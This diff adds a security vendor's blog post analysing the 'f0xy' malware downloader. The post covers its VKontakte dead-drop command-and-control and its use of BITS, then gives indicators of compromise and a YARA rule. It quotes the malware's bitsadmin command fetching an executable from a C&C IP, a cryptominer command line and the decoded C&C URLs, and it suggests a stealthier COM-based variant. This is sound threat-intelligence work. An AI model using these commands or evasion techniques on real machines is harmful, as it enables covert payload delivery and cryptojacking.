@@ -1,0 +1,143 @@
+New 'f0xy' malware is intelligent - employs cunning stealth & trickery
+
+Websense Security Labs have discovered a new and emerging malware downloader that employs evasion techniques and downloads a cryptocurrency miner. The new malware, which we have named 'f0xy', is able to dynamically change its command-and-control (C&C), and download and execute arbitrary files. More interestingly, f0xy's evasion tactics include leveraging the popular Russian social networking site VKontakte, and employing Microsoft's Background Intelligent Transfer Service to download files.
+
+The behavior of f0xy backs up our 2015 security predictions that cybercriminals will continue to hide their C2 infrastructure within legitimate websites. We believe that this will be a growing trend in 2015, as malware authors realize that detecting malicious intent on legitimate websites can be difficult for security vendors.
+
+Websense customers are protected against this threat with ACE, our Advanced Classification Engine, at the different stages of the attack detailed below:
+
+Stage 5 (Dropper) – ACE has detection for malicious files used in this campaign, including detection of the malicious behavior utilized by f0xy.
+
+Stage 6 (Call Home) – ACE detects the communication to the C&C points associated with the f0xy downloader.
+
+File Sandbox report for the f0xy downloader dropper file: http://csi.websense.com/ThreatScope/FileAnalysis?requestId=ddf3d016-d8ac-4220-969e-a42f002a0039
+
+Hunting Down f0xy
+
+When we took a closer look at the malware, we saw only 5/57 detections by security vendors for the initial dropper file f522e0893ec97438c6184e13adc48219f08b67d8.
+
+Upon investigating the C&C infrastructure, further samples were found dating back to 13 January 2015. Analysis suggests that the malware author has been changing and improving the code for reliability and efficiency, and to arrive at a version that works on most operating systems. First versions of the malware will run only on Windows 6.0 (Vista) and above, while the newer versions will also run on Windows XP.
+
+We decided to name the malware 'f0xy' due to the strings found in the executables, and the registry key it creates for persistence.
+
+To date, we have not seen any evidence in our customer base of an attempt to infect a machine with f0xy. Websense Security Labs will continue to monitor the campaign, because we may see it targeting users in the near future.
+
+Stealth & Evasion Tactics
+
+Just as a real fox is known in many cultures for its cunning and trickery, so is the malware. There are three distinctive features that allow the malware to fly under the radar:
+
+The malware employs very little in the way of code and string obfuscation, in order to appear more legitimate and hide in plain sight.
+
+A request is made to the Russian social networking site VKontakte, where the address of the real C&C is hidden.
+
+Finally, the malware uses Microsoft's Background Intelligent Transfer service to outsource its network traffic, to avoid detection from security products.
+
+While there is little in the way of obfuscation within the malware itself, we can see a base64 encoded string located in the midst of some HTTP strings:
+
+Decoding the string results in a VKontakte user profile's 'wall' URL:
+
+api.vk.com/method/wall.get?count=1&owner_id=-81972386
+
+Executing the malware confirms that a request to this URL is made, with another base64 encoded string found as one of the comments on the user profile wall:
+
+{"response":[17,{"id":23,"from_id":-81972386,"to_id":-81972386,"date":1420910628,"post_type":"post","text":"PGdhdGU+PHNydj48Z2V0PjE4NS41My4xNjkuNzkvaGVsbG8ucGhwPC9nZXQ+PGpvYj4xODUuNTMuMTY5Ljc5L2dldGpvYi5waHA8L2pvYj48a25vY2s+MTg1LjUzLjE2OS43OS9pbmRleC5waHA8L2tub2NrPjxwb3J0PjgwPC9wb3J0Pjwvc3J2PjwvZ2F0ZT4=","comments":{"count":0},"likes":{"count":0},"reposts":{"count":0}}]}
+
+Decoding this one reveals the C&C URLs:
+
+<gate><srv><get>185.53.169.79/hello.php</get><job>185.53.169.79/getjob.php</job><knock>185.53.169.79/index.php</knock><port>80</port></srv></gate>
+
+Analysis of subsequent network traffic and the behavior of the malware tells us that the <get> URL is responsible for obtaining an identifier to use for further requests, the <job> URL is responsible for asking the C&C what to do, and the<knock> URL is responsible for initially checking into the C&C, reporting information about the current environment where the malware is running, and optionally receiving a response back that tells it to download another version of the malware.
+
+Leveraging the Microsoft Background Intelligent Transfer Service
+
+The f0xy downloader calls upon bitsadmin.exe to download its payloads, which is the Microsoft Background Intelligent Transfer Service (BITS). BITS provides a way of using idle bandwidth to perform file transfers, meaning that bandwidth requirements from other applications are not interrupted or interfered with. Many Windows services rely upon this service, including Windows Update and Windows Defender.
+
+The malware assigns the BITS job name "Download_f0xy" when performing these transfers, and specifies where to download the files:
+
+bitsadmin /transfer Download_f0xy hxxp://185.53.169.79/bn_versions/11.exe" "C:\Documents and Settings\user\Application Data\Microsoft\f0xyupdate.exe"
+
+Presumably the main reason for using BITS is to prevent security products from flagging its behavior as suspicious, because anti-malware solutions are much less likely to have a problem with bitsadmin.exe performing network requests than an unknown executable. However, this process could be made even more stealthy by interacting with BITS through its Component Object Model (COM) interface, instead of calling upon the executable directly.
+
+Financial Motivation
+
+Websense Security Labs have observed f0xy downloading a 64-bit version of the cryptocurrency miner CPUMiner. The miner is executed by f0xy with the following command line:
+
+minerd -o stratum+tcp://EU.coinmine.pw:1111 -u sorted -p x
+
+CoinMine.pw is a cryptocurrency mining service for multiple currencies, and allows a user to name 'workers' that can pool together to mine on behalf of a user's account. We can see from this command line that the worker name sorted is used, which presumably belongs to the malware actor distributing f0xy. The more machines infected by f0xy and mining under this worker name, the more potential cryptocurrency can be mined for the cybercriminal.
+
+Indicators of Compromise
+
+The following are indicators of a compromised machine:
+
+Sample SHA1s
+
+080c61c9172cd49f6e4e7ef27285ccaaf6d5f0ac
+
+c25da337ec5ac041312b062e7fb697e4f01ca8d9
+
+cd4e297928502dece4545acbe0b94dd1270f955c
+
+adbf0e4d37e381fe7599695561262d1a65205317
+
+54d2810aaae67da9fa24f4e11f4c2d5fe4d2b6d4
+
+7de3ed8f751a528fde1688d35c6eb5533b09ae11
+
+812e453c22e1a9f70b605cd27d3f642c3778d96d
+
+55c9d015b1f8d68e6b5ce150f2dbab2b621dac1c
+
+e80d7f27405ece2697a05d6c2612c63335851490
+
+f4f1d8bceb62c72f2fe6713c5395555917fc40ad
+
+2a4837fdb331f823ca474f521248b2cdb766528f
+
+f522e0893ec97438c6184e13adc48219f08b67d8
+
+Network Traffic
+
+hxxp://api.vk.com/method/wall.get?count=1&owner_id=-81972386hxxp://185.53.169.79
+
+File Names
+
+%appdata%\Microsoft\svchost.exe%appdata%\Microsoft\f0xyupdate.exe%appdata%\Microsoft\Bot_ID
+
+Registry Keys
+
+Key: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceName:f0xy
+
+YARA Rule
+
+The following YARA rule can be used to hunt for more samples:
+
+rule ws_f0xy_downloader {
+
+meta:
+
+description = "f0xy malware downloader"
+
+author = "Nick Griffin (Websense)"
+
+strings:
+
+$mz="MZ"
+
+$string1="bitsadmin /transfer"
+
+$string2="del rm.bat"
+
+$string3="av_list="
+
+condition:
+
+($mz at 0) and (all of ($string*))
+
+}
+
+Summary
+
+It is clear that financial motivations remain at the forefront of cybercriminal minds, with the anonymity of cryptocurrency providing a somewhat safer route for collecting the spoils. We also expect to see a continuing growth of malware authors migrating to legitimate and reputable websites, to hide their malicious activities, and we expect plenty more evasion tactics adopted as authors continue to subvert security products. We have configured our ThreatSeeker® Intelligence Cloud to look for more indicators of compromise, and we use tools like Yara to supplement our own analytics.
+
+Blog author: Nick Griffin
